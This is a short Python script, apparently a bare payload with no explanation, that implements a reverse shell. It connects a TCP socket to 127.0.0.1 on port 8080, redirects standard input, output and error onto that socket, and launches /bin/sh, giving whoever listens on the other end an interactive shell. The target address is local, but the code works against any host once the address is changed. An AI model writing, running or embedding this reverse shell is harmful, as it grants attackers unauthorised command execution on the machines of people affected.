import os
import socket
import sys

IP = "127.0.0.1"
PORT = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))

os.dup2(s.fileno(),sys.stdin.fileno())
os.dup2(s.fileno(),sys.stdout.fileno())
os.dup2(s.fileno(),sys.stderr.fileno())

os.system("/bin/sh")
